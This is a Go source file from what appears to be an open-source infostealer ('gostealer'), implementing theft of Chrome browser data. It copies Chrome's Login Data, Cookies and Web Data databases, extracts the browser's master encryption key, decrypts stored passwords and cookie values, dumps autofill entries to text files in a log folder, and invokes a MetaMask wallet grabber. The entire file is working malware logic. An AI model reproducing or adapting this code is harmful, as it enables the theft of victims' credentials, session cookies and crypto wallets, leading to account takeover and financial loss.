package browsers

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
	"github.com/4kord/gostealer/utils/decrypt"
	"github.com/4kord/gostealer/wallets"
)

func Chrome(browserPath, logFolderPath string) {
	browserKey := decrypt.GetBrowserEncryptedKey(browserPath)

	err := os.WriteFile(path.Join(logFolderPath, "raw", "chrome_masterkey.txt"), browserKey, 0644)
	if err != nil {
		log.Println(err)
	}

	browserPasswords := getChromePasswords(browserPath, logFolderPath, browserKey)
	browserCookies := getChromeCookies(browserPath, logFolderPath, browserKey)
	browserAutofill := getChromeAutofill(browserPath, logFolderPath)

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Chrome", "Passwords.txt"), []byte(browserPasswords), 0644)
	if err != nil {
		log.Println(err)
	}

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Chrome", "Cookies.txt"), []byte(browserCookies), 0644)
	if err != nil {
		log.Println(err)
	}

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Chrome", "Autofill.txt"), []byte(browserAutofill), 0644)
	if err != nil {
		log.Println(err)
	}

	wallets.GetMetamaskChrome(browserPath, logFolderPath)
}

func getChromePasswords(browserPath, logFolderPath string, key []byte) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Login Data"), path.Join(logFolderPath, "raw", "chrome_login_data"))
	if err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}

	sqllitePath := path.Join(logFolderPath, "raw", "chrome_login_data")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}
	defer rows.Close()

	for rows.Next() {
		entry := PasswordEntry{}
		err := rows.Scan(&entry.OriginUrl, &entry.Username, &entry.Password)
		if err != nil {
			panic(err)
		}

		entry.Password = decrypt.DecryptWithKey(key, []byte(entry.Password))
		data += fmt.Sprintf("URL: %s | Username: %s | Password: %s\n", entry.OriginUrl, entry.Username, entry.Password)
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}

	return data
}

func getChromeCookies(browserPath, logFolderPath string, key []byte) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Network", "Cookies"), path.Join(logFolderPath, "raw", "chrome_cookies"))
	if err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}

	sqllitePath := path.Join(logFolderPath, "raw", "chrome_cookies")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}

	rows, err := db.Query("SELECT host_key, path, expires_utc, name, encrypted_value FROM cookies")
	if err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}
	defer rows.Close()

	for rows.Next() {
		entry := CookieEntry{}
		err := rows.Scan(&entry.Host, &entry.Path, &entry.Expiry, &entry.Name, &entry.Value)
		if err != nil {
			log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
		}

		entry.Value = decrypt.DecryptWithKey(key, []byte(entry.Value))
		data += fmt.Sprintf("Host: %s | Path: %s | Expiry: %d | Name: %s | Value: %s\n", entry.Host, entry.Path, entry.Expiry, entry.Name, entry.Value)
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}

	return data
}

func getChromeAutofill(browserPath, logFolderPath string) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Web Data"), path.Join(logFolderPath, "raw", "chrome_web_data"))
	if err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}

	sqllitePath := path.Join(logFolderPath, "raw", "chrome_web_data")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}

	rows, err := db.Query("SELECT name, value FROM autofill")
	if err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}
	defer rows.Close()

	for rows.Next() {
		entry := AutofillEntry{}
		err := rows.Scan(&entry.Name, &entry.Value)
		if err != nil {
			log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
		}

		data += fmt.Sprintf("Name: %s | Value: %s\n", entry.Name, entry.Value)
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
	}

	return data
}
